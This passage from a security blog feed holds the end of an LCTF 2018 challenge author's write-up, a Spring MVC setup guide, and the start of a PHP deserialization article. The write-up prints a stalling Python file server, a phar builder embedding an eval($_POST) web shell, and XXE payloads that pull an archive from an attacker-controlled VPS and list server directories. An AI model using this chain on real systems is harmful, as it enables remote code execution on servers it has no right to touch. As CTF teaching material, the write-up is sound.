协议，通过这个协议我们能向远程服务器去请求文件（没错是一个远程的文件，这相比于 php 的 phar 只能请求本地文件来说要强大的多），并且在传输过程中会生成一个临时文件在某个临时目录中，好了分析到这里又有一些问题了</p><h4 id="发现的问题："><a href="#发现的问题：" class="headerlink" title="发现的问题："></a><strong>发现的问题：</strong></h4><p>(1)如果我们能通过 jar 协议在题目 服务器生成一个临时文件，那我们就能利用其进行包含，但是似乎我们不知道文件路径更没法预测文件名<br>(2)我们的包含是要通过反序列化实现的，也就是说我们如果想要包含临时文件，那么我们必须要在 payload 文件中写好临时文件名，但是 payload 是在生成临时文件以前生成的(或者说 payload 就是那个临时文件)，于是这里就形成了一个死循环<br>(3)临时文件很快就会消失，但是我们的反序列化一以及后面的操纵非常的复杂，甚至没法直接通过脚本实现，那么在没法条件竞争的情况下如何延长文件的传输时间</p><h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a><strong>问题解决</strong></h4><h5 id="问题一："><a href="#问题一：" class="headerlink" title="问题一："></a><strong>问题一：</strong></h5><p>想知道文件名和文件路径，很简单我们只要知道文件路径然后利用我们的 netdoc 去列目录就能知道文件名了，那么路径怎么知道，这里有两种方法</p><p><strong>方法一：</strong></p><p>先列一下目录，大概判断一下环境，本地搭一个相似的环境去测试，找到临时文件的路径，但我想这个方法没人用，代价太大了。</p><p><strong>方法二：</strong></p><p>其实你在测试过程中应该能发现报错信息没有屏蔽，我们可以通过报错拿到我们的文件路径，但是如何报错？这其实还是一个问题，因为 Jar 协议本身有一个解包的过程，如果你请求的文件包里面没有那么就会报错，获取这个包的临时文件的位置(下图的 jar.zip 就是一个单纯的压缩包文件，如果是 Phar 文件是不会成功的，jar 不能解析 phar 格式的文件)</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%869.png" alt="此处输入图片的描述"></p><h5 id="问题二："><a href="#问题二：" class="headerlink" title="问题二："></a><strong>问题二：</strong></h5><p>我们已经清楚，生成的临时文件就是我们的 payload ，我们要通过这个 payload 完成反序列化和文件包含两个功能，但是他自己是 无法在上传之前知道自己的文件名的，没有确定的路径和文件名就没法包含，于是之前对 move 函数的分析就映入脑海，我们似乎能利用这个 move 函数将这个临时文件搬移到我们已知的路径，这其实也是我设计这个函数的目的</p><h5 id="问题三："><a href="#问题三：" class="headerlink" title="问题三："></a><strong>问题三：</strong></h5><p>这个问题也是一个非常关键的点，也是这道题的难点中的难点，既然不能条件竞争，我们该怎么办，实际上我们可以通过自己写服务器端的方法完成这个功能，因为文件本身就在自己的服务器上，我想让他怎么传不是完全听我的？于是我写了一个简单的 TCP 服务器，这个服务器的特点就是在传输到文件的最后一个字节的时候突然暂停传输，我使用的是 sleep() 方法，这样就延长了时间，而且是任意时间的延长，但是实际上这厉害牵扯出一个问题，就是我们这样做文件实际上是不完整的，所以我们需要精心构造一个 payload 文件，这个文件的特点就是我在最后一个字节的后面又添加了一个垃圾字节，这样实际上在暂停过程中文件已经传输完毕了，只是服务器认为没有成功传输而已</p><p><strong>代码如下：</strong></p><pre><code class="hljs">import sys import time import threading import socketserver from urllib.parse import quote import http.client as httpc listen_host = &#39;localhost&#39; listen_port = 9999 jar_file = sys.argv[1]class JarRequestHandler(socketserver.BaseRequestHandler):  def handle(self):http_req = b&#39;&#39;print(&#39;New connection:&#39;,self.client_address)while b&#39;\r\n\r\n&#39; not in http_req:try:http_req += self.request.recv(4096)print(&#39;\r\nClient req:\r\n&#39;,http_req.decode())jf = open(jar_file, &#39;rb&#39;)contents = jf.read()headers = (&#39;&#39;&#39;HTTP/1.0 200 OK\r\n&#39;&#39;&#39;&#39;&#39;&#39;Content-Type: application/java-archive\r\n\r\n&#39;&#39;&#39;)self.request.sendall(headers.encode(&#39;ascii&#39;))self.request.sendall(contents[:-1])time.sleep(300)print(30)self.request.sendall(contents[-1:])except Exception as e:print (&quot;get error at:&quot;+str(e))if __name__ == &#39;__main__&#39;:jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) print (&#39;waiting for connection...&#39;) server_thread = threading.Thread(target=jarserver.serve_forever) server_thread.daemon = True server_thread.start() server_thread.join()</code></pre><p>到此为止，我对整道题的难点分析就结束了，下面就是大致的解题过程</p><h2 id="0X04-解题过程"><a href="#0X04-解题过程" class="headerlink" title="0X04 解题过程"></a><strong>0X04 解题过程</strong></h2><h3 id="1-查看自己的-remote-addr-结合-K0rz3n-字符串生成md5"><a href="#1-查看自己的-remote-addr-结合-K0rz3n-字符串生成md5" class="headerlink" title="1.查看自己的 remote_addr 结合 K0rz3n 字符串生成md5"></a><strong>1.查看自己的 remote_addr 结合 K0rz3n 字符串生成md5</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?phpecho md5(&quot;K0rz3n&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">4253b1c836a25962c1547f7e46f373f1</code></pre><p>这个就是我们会在 file 文件夹中生成的文件夹，我们会把我们的 payload 转移到这个文件夹下重命名然后进行包含</p><h3 id="2-生成反序列化-payload-文件"><a href="#2-生成反序列化-payload-文件" class="headerlink" title="2.生成反序列化 payload 文件"></a><strong>2.生成反序列化 payload 文件</strong></h3><p><strong>payload 代码：</strong></p><pre><code class="hljs">&lt;?php class K0rz3n_secret_flag &#123;        protected $file_path;        function __construct()&#123;        $this-&gt;file_path = &quot;phar:///var/www/file/4253b1c836a25962c1547f7e46f373f1/jar.zip/test.txt&quot;;//这是文件包含的payload        &#125;&#125;    @unlink(&quot;phar.phar&quot;);    $phar = new Phar(&quot;phar.phar&quot;);                   //后缀必须是 phar    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);     $o = new K0rz3n_secret_flag();//我们将对象在这里创建    $phar-&gt;setMetadata($o); //将对象在这里序列化    $phar-&gt;addFromString(&quot;test.txt&quot;, &#39;&lt;?php eval($_POST[&quot;cmd&quot;])?&gt;&#39;); //我们文件包含的时候会触发 getshell    $phar-&gt;stopBuffering();   ?&gt;</code></pre><p>运行这段代码以后我们就能获取到一个 phar.phar 文件，然后我们根据自己习惯改名后还要在文件末尾添加一个垃圾字节</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E5%9E%83%E5%9C%BE%E5%AD%97%E8%8A%82.png" alt="此处输入图片的描述"></p><h3 id="3-判断临时文件目录"><a href="#3-判断临时文件目录" class="headerlink" title="3.判断临时文件目录"></a><strong>3.判断临时文件目录</strong></h3><p>我们先随意打包一个压缩包(假设里面是一个xxe.php)上传到自己的服务器上，然后启动我们的自定义的服务器脚本，监听服务器的 9999 端口，然后本地利用 XXE 去请求这个文件，请求的时候我们要故意写一个不存在文件，比如 1.php </p><p><strong>如图所示:</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%8E%B7%E5%BE%97%E8%AF%B7%E6%B1%82.png" alt="此处输入图片的描述"></p><p>我们服务器已经接收到了我们 XXE 发出的请求，然后后面的报错就和上面分析的一样，这里就不在赘述</p><h3 id="4-通过列目录确定我们的payload文件名"><a href="#4-通过列目录确定我们的payload文件名" class="headerlink" title="4.通过列目录确定我们的payload文件名"></a><strong>4.通过列目录确定我们的payload文件名</strong></h3><p>我们将 server.py 这个服务器脚本的 sleep() 时间调的稍微长一些，比如调整为 600 s ，然后将我们的 payload 文件传上去，通过 XXE 请求这个文件，这时候临时文件生成，然后我们再通过 XXE 列目录得到临时文件名</p><p><strong>请求 payload：</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;jar:http://yourvps:9999/jarn.zip!/test.txt&quot; &gt;]&gt;&lt;creds&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><strong>得到临时文件名</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;netdoc:///usr/local/tomcat/temp/&quot; &gt;]&gt;&lt;creds&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%8E%B7%E5%BE%97%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%90%8D.png" alt="此处输入图片的描述"></p><h3 id="5-调用-Move-函数实现文件的拷贝"><a href="#5-调用-Move-函数实现文件的拷贝" class="headerlink" title="5.调用 Move 函数实现文件的拷贝"></a><strong>5.调用 Move 函数实现文件的拷贝</strong></h3><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E6%96%87%E4%BB%B6%E6%8B%B7%E8%B4%9D.png" alt="此处输入图片的描述"></p><p><strong>示例代码：</strong></p><pre><code class="hljs">http://212.64.7.171/LCTF.php?m=move&amp;source=/usr/local/tomcat/temp/jar_cachexxxxxxxxxxxx.tmp&amp;dest=jar.zip</code></pre><p>这个时候我们的 payload 已经在我们可控的目录中了，并且被我们重名名为了 jar.zip ,这个我们在 payload 文件中写的是一致的</p><h3 id="6-调用-check-函数实现反序列化-getshell"><a href="#6-调用-check-函数实现反序列化-getshell" class="headerlink" title="6.调用 check 函数实现反序列化 getshell"></a><strong>6.调用 check 函数实现反序列化 getshell</strong></h3><p>我们先在浏览器看一下：</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="此处输入图片的描述"></p><p><strong>示例代码：</strong></p><pre><code class="hljs">http://212.64.7.171/LCTF.php?m=check&amp;c=compress.zlib://phar:///usr/local/tomcat/temp/jar_cachexxxxxxxxxxxxxxxxxx.tmp</code></pre><p>没啥反应，其实我们放到菜刀里就有反映了</p><p><strong>如图所示:</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20getshell.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20getshell2.png" alt="此处输入图片的描述"></p><p>这里还要注意一点，我们在创建 shell 的时候还要注意我们必须带上 cookie: 要不然会被 php 本身的逻辑给 die 掉</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20cookie.png" alt="此处输入图片的描述"></p><h3 id="7-找-flag"><a href="#7-找-flag" class="headerlink" title="7.找 flag"></a><strong>7.找 flag</strong></h3><p>我说过 flag 没有在什么文件里，为了防止 XXE 该翻到，于是只能通过 grep 全局搜索，如果全局不行的话，就一个一个文件夹的全局，可能这个 shell 没法支持这么大的搜索量</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20flag.png" alt="此处输入图片的描述"></p><h2 id="0X05-总结"><a href="#0X05-总结" class="headerlink" title="0X05 总结"></a><strong>0X05 总结</strong></h2><p>出这道题之前其实找了很久的思路，发现自己对知识的理解还是非常的肤浅，也学会了有时候看文档才是最好的学习方法，写这道题也用了很久，请教了非常多的大师傅，就在这里统一感谢一下，特别是 Java 的部分，因为写 Java 写的不多 ,想要实现一个自己脑袋里面的想法真的很难，甚至都把微信 XXE 的漏洞部分代码进行了巧妙的移植，不过我还是克服重重困难实现了功能，不管这道题出的好坏与否，脑洞与否，我都是出于技术交流与分享的目的，希望能将自己学到的东西以题目的形式展现给大家，没有任何的经济成分，这或许也是 CTF 一开始的目的吧，但是现在似乎已经不是这样了，总之做技术还是保持本心吧，还是那句话：”你的知识面，决定着你的攻击面”。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全 CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建 Spring MVC 框架踩坑记</title>
    <link href="/2018/11/19/%E6%90%AD%E5%BB%BA%20Spring%20MVC%20%E6%A1%86%E6%9E%B6%E8%B8%A9%E5%9D%91%E8%AE%B0/"/>
    <url>/2018/11/19/%E6%90%AD%E5%BB%BA%20Spring%20MVC%20%E6%A1%86%E6%9E%B6%E8%B8%A9%E5%9D%91%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>出于出LCTF 2018 题目的原因，不得不自己搭建一个 Spring MVC 框架，虽然这只是一地步，但是踩了无数的坑，我在这里简单的记录一下</p><h2 id="0X01-创建项目"><a href="#0X01-创建项目" class="headerlink" title="0X01 创建项目"></a><strong>0X01 创建项目</strong></h2><p>怎么创建项目呢，创建什么项目呢？这本身就是一个问题，后来在TG师傅的指点下，我最终选择了使用 maven 的方式创建项目，因为这种方法使用 pom.xml 统一管理 jar 包，添加和管理都很方便</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/maven%E9%80%89%E6%8B%A9.png" alt="此处输入图片的描述"></p><span id="more"></span><p>这里选择 release 或者1.3 都可以，但是这其实是一个坑（这个坑后面会遇到 el 不支持的问题，我们后面再解决）</p><p>选择好了以后，我们填写一些基本的信息</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF.png" alt="此处输入图片的描述"></p><p>groupid 是填写类似于包名的内容，因为是本地项目，对我的意义不大，随便写一下，artifactld 是填写你当前项目的名称(这两个选项待会我们还会遇见类似的在 pom.xml 里面，我们待会介绍)</p><p>然后我们 next ，这里 settings.xml 文件默认是不存在在那个目录下的，我们需要从 IDEA 的原始目录中拷贝（IDEA 似乎自带了两个版本的 maven 如果你选择了3 那就拷贝 3下面的 settings.xml 如果是二就以此类推），我的路径是 </p><pre><code class="hljs">D:\IDEA\IntelliJ IDEA 2018.2.4\plugins\maven\lib\maven3\conf\settiungs.xml</code></pre><p> 拷贝完以后，我们需要对这个文件进行修改，因为我国的国情，原来的源是不能用的，我们要换国内源</p><p> 在 <code>&lt;mirrors&gt;</code>标签里面加上下面的语句</p><pre><code class="hljs">&lt;id&gt;alimaven&lt;/id&gt;&lt;mirrorOf&gt;central&lt;/mirrorOf&gt;&lt;name&gt;aliyun maven&lt;/name&gt;&lt;url&gt;http://maven.aliyun.com/nexus/content/repositories/central/&lt;/url&gt;</code></pre><p>然后我们就下一步下一步，然后就静静等待项目框架加载完毕   </p><h2 id="0X02-配置-pom-xml"><a href="#0X02-配置-pom-xml" class="headerlink" title="0X02 配置 pom.xml"></a><strong>0X02 配置 pom.xml</strong></h2><p>完毕以后我们就能修改 pom.xml 添加依赖，这里指的就是下载一些必要的 jar 包</p><p><strong>以下是我添加进去的内容</strong></p><pre><code class="hljs">      &lt;dependency&gt;          &lt;groupId&gt;commons-logging&lt;/groupId&gt;          &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;          &lt;version&gt;1.2&lt;/version&gt;      &lt;/dependency&gt;      &lt;dependency&gt;          &lt;groupId&gt;org.springframework&lt;/groupId&gt;          &lt;artifactId&gt;spring-aop&lt;/artifactId&gt;          &lt;version&gt;4.3.5.RELEASE&lt;/version&gt;      &lt;/dependency&gt;      &lt;dependency&gt;          &lt;groupId&gt;org.springframework&lt;/groupId&gt;          &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;          &lt;version&gt;4.3.5.RELEASE&lt;/version&gt;      &lt;/dependency&gt;      &lt;dependency&gt;          &lt;groupId&gt;org.springframework&lt;/groupId&gt;          &lt;artifactId&gt;spring-context&lt;/artifactId&gt;          &lt;version&gt;4.3.5.RELEASE&lt;/version&gt;      &lt;/dependency&gt;      &lt;dependency&gt;          &lt;groupId&gt;org.springframework&lt;/groupId&gt;          &lt;artifactId&gt;spring-core&lt;/artifactId&gt;          &lt;version&gt;4.3.5.RELEASE&lt;/version&gt;      &lt;/dependency&gt;      &lt;dependency&gt;          &lt;groupId&gt;org.springframework&lt;/groupId&gt;          &lt;artifactId&gt;spring-expression&lt;/artifactId&gt;          &lt;version&gt;4.3.5.RELEASE&lt;/version&gt;      &lt;/dependency&gt;      &lt;dependency&gt;          &lt;groupId&gt;org.springframework&lt;/groupId&gt;          &lt;artifactId&gt;spring-web&lt;/artifactId&gt;          &lt;version&gt;4.3.5.RELEASE&lt;/version&gt;      &lt;/dependency&gt;      &lt;dependency&gt;          &lt;groupId&gt;org.springframework&lt;/groupId&gt;          &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;          &lt;version&gt;4.3.5.RELEASE&lt;/version&gt;      &lt;/dependency&gt;      &lt;dependency&gt;          &lt;groupId&gt;javax/servlet&lt;/groupId&gt;          &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;          &lt;version&gt;2.3&lt;/version&gt;      &lt;/dependency&gt;      &lt;dependency&gt;          &lt;groupId&gt;javax/servlet&lt;/groupId&gt;          &lt;artifactId&gt;jstl&lt;/artifactId&gt;          &lt;version&gt;1.0.6&lt;/version&gt;      &lt;/dependency&gt;</code></pre><p><strong>这里面的命名规则是什么？</strong></p><p> groupid 就是这个 Jar 所在的远程的包的名字<br> artifactId 就是这个包自己的名字<br> version 就是版本</p><p> 这里我推荐一个网站，能清楚地查询这些信息</p><p><a href="https://mvnrepository.com/">https://mvnrepository.com</a></p><p> <strong>补充一点：</strong></p><p> 如果想包随着 pom.xml 实时更新的话，可以在 File-&gt;settings-&gt;Build.Execution,Deployment-&gt;Build Tools-&gt; Maven 里面选择 Always update snapashots</p><h2 id="0X03-添加框架依赖"><a href="#0X03-添加框架依赖" class="headerlink" title="0X03 添加框架依赖"></a><strong>0X03 添加框架依赖</strong></h2><p>到刚刚为止我们只是简单地创建了一个项目，是不是感觉和 spring 一点关系都没有，没错！于是我们现在要添加框架依赖</p><p>右键我们的项目，选择 add framework support</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B7%BB%E5%8A%A0%E6%A1%86%E6%9E%B6%E4%BE%9D%E8%B5%96.png" alt="此处输入图片的描述"></p><p>选择 Spring 在选择 Spring MVC </p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A1%86%E6%9E%B6%E4%BE%9D%E8%B5%96%E9%80%89%E9%A1%B9.png" alt="此处输入图片的描述"></p><p> <strong>这里注意两点：</strong></p><p> (1)要勾选那个自动创建配置文件的选项(这个选项在选择 Spring 的时候出现，但是选择 Spring MVC 的时候没有)<br> (2)如果框架选项里面没有 Spring ，那估计是在你的 project structor 里面 的 modules 里面配置了一个 spring 这可能是由于加载依赖的时候自动弄得，我们要手动删除</p><p> <strong>如图所示：</strong></p><p> <img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A1%86%E6%9E%B6%E4%BE%9D%E8%B5%96%E5%A6%82%E6%9E%9C%E4%B8%8D%E5%AD%98%E5%9C%A8.png" alt="此处输入图片的描述"></p><p><strong>添加完框架依赖的目录结构如图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B7%BB%E5%8A%A0%E5%AE%8C%E6%A1%86%E6%9E%B6%E4%BE%9D%E8%B5%96%E5%90%8E%E7%9A%84%E7%9B%AE%E5%BD%95.png" alt="此处输入图片的描述"></p><p>框起来的部分就是他自动生成的配置文件</p><h2 id="0X04-完善目录结构"><a href="#0X04-完善目录结构" class="headerlink" title="0X04 完善目录结构"></a><strong>0X04 完善目录结构</strong></h2><p>我们一般在 WEB-INF 里面添加的是 静态文件已经 jsp 视图文件，main 里面添加一个叫做 java的 资源文件夹用来放控制器，再添加一个 resources 作为资源文件夹，再在 src 同级建一个 target 作为导出目录</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E5%A5%BD%E7%9A%84%E7%9B%AE%E5%BD%95.png" alt="此处输入图片的描述"></p><p>但是创建完毕以后我们发现，我们没法再 java 文件夹中创建 class 或者 package ，这是因为我们还没有给他们模型，我们要到 project structor 里面去设置</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BE%E7%BD%AE%E4%BA%86%E6%A8%A1%E5%9E%8B%E5%90%8E%E7%9A%84%E7%9B%AE%E5%BD%95.png" alt="此处输入图片的描述"></p><p>可以看到变了颜色，这就说明设置好了，我们就可以创建我们的项目了</p><h2 id="0X05-写项目"><a href="#0X05-写项目" class="headerlink" title="0X05 写项目"></a><strong>0X05 写项目</strong></h2><p>首先配置 web.xml 这是整个项目的配置文件，我们最后要根据这个文件的配置去找我们的 servlet </p><p><strong>示例配置：</strong></p><pre><code class="hljs">    &lt;servlet&gt;        &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt;        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt;        &lt;url-pattern&gt;/&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;</code></pre><p><strong>注意：</strong></p><p>(1)其中 org.springframework.web.servlet.DispatcherServlet 非常重要，这个是 spring 框架的核心，就是他根据我们传过来的名字 去寻找对应的 servlet 的配置文件的<br>(2) 其中 &#x2F; 表示根路径的全部请求都用 dispatcher 这个 servlet 来接收</p><p>配置好了项目的配置文件，我们再继续配置 servlet 的配置文件，这个文件我们如果需要可以手动创建，命名规则就是  servlet名-servlet.xml ，因为初始化的时候 servlet 就叫 dispatcher 我们又选了自动生成，于是这个配置文件已经有了，我们只需要修改，如果没有，我们就要另外创建</p><p><strong>dispatcher-servlet.xml</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.2.xsd&quot;&gt;    &lt;context:component-scan base-package=&quot;com.spring&quot; /&gt;    &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;        &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/view/&quot; /&gt;        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;    &lt;/bean&gt;&lt;/beans&gt;</code></pre><p>其中</p><pre><code class="hljs">&lt;context:component-scan base-package=&quot;com.spring&quot; /&gt;</code></pre><p>这部分是用来扫描包的，这个包就是我们应该在 java 文件夹中创建的包的前两个节点，比如我们创建 com.spring.test 这个包，那我们就写 com.spring<br>但是为了实现这个功能，光写这个还不够，我们还需要添加 beans 的内容，添加下面这两行</p><pre><code class="hljs">http://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context-4.2.xsd</code></pre><p>然后我们需要指定我们的 视图存在位置和后缀名</p><pre><code class="hljs">&lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/view/&quot; /&gt;&lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;</code></pre><p><strong>然后我们写 controller</strong></p><p><strong>HelloController.java</strong></p><pre><code class="hljs">package com.spring.test;import org.springframework.stereotype.Controller;import org.springframework.ui.ModelMap;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;@Controller@RequestMapping(&quot;/hello&quot;)public class HelloController &#123;    @RequestMapping(method = RequestMethod.GET)    public String printHello(ModelMap model)&#123;        model.addAttribute(&quot;message&quot;,&quot;Hello Spring MVC FrameWork&quot;);        return &quot;hello&quot;;    &#125;&#125;</code></pre><p><strong>我们写 jsp</strong> </p><p><strong>hello.jsp</strong></p><pre><code class="hljs">&lt;%@ page contentType=&quot;text/html; charset=UTF-8&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Hello World&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;Hello, $&#123;message&#125;&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>坑点：</strong></p><p>这里面最坑的就是没法解析 el 语句，因为我们下载的 web.xml 是 2.3 版本，以后的版本就支持了，所以为了解决这个问题我们需要修改一下 web.xml 的头</p><p><strong>注释掉下面这一部分：</strong></p><pre><code class="hljs">&lt;!DOCTYPE web-app PUBLIC &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot; &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;                                                    </code></pre><p><strong>修改一部分成下面这个样子</strong></p><pre><code class="hljs">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;         version=&quot;4.0&quot;&gt;                                                                                                                                                            </code></pre><p>然后再添加我们本地的 tomcat 项目就能运行了</p><h2 id="0X06-扩展"><a href="#0X06-扩展" class="headerlink" title="0X06 扩展"></a><strong>0X06 扩展</strong></h2><p>如果我们想写多个 servlet 的话，我们可以把 web.xml 改成下面这个样子，这样他会去找不同的 servlet 配置文件实现不同的功能，而在这种情况下， controller 里面的路由是基于 web.xml 的，比如 web.xml 配置 &#x2F;error&#x2F;* 的都去找 erorController ,然后 controller 写的是 &#x2F;error ，那我们最终访问的时候就是 &#x2F;error&#x2F;error才能访问到这个控制器</p><p><strong>web.xml部分内容</strong></p><pre><code class="hljs">    &lt;servlet&gt;        &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt;        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt;        &lt;url-pattern&gt;/right/*&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;error&lt;/servlet-name&gt;        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;        &lt;load-on-startup&gt;2&lt;/load-on-startup&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;error&lt;/servlet-name&gt;        &lt;url-pattern&gt;/error/*&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;</code></pre><h2 id="0X07-总结"><a href="#0X07-总结" class="headerlink" title="0X07 总结"></a><strong>0X07 总结</strong></h2><p>这篇文章只是搭建框架中的一点记录防止忘记，以后还要深入学习。</p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java 备忘 笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一篇文章带你深入理解漏洞之 PHP 反序列化漏洞</title>
    <link href="/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>自从 Orange 在 2017年的 hitcon 出了一个 0day 的 php phar:&#x2F;&#x2F; 反序列化给整个安全界开启了新世界的大门以后，php 反序列化这个漏洞就逐渐升温，没想到后来 2018 年 blackhat 的议题上这个问题再次被提及，利用的还是 Orange 的思路(我只能 orz),到现在 phar:&#x2F;&#x2F; 反序列化已经成为了各大 CTF 炙手可热的思路，就仿佛 2016 年的 CVE-2016-7124 绕过 __weakup 一样，于是我也把这篇文章提上日程，希望能在对整个 PHP 反序列化漏洞的剖析过程中对其有更深入的理解，也希望读者在读我的文章中能有不一样的体验和收获(如果真的是这样，这将是我莫大的荣幸)</p><h2 id="0X01-什么是序列化和反序列化"><a href="#0X01-什么是序列化和反序列化" class="headerlink" title="0X01 什么是序列化和反序列化"></a><strong>0X01 什么是序列化和反序列化</strong></h2><h3 id="1-从-json-开始类比"><a href="#1-从-json-开始类比" class="headerlink" title="1.从 json 开始类比"></a><strong>1.从 json 开始类比</strong></h3><p>我先不说序列化，大家都看到过 json 数据吧，<strong>json 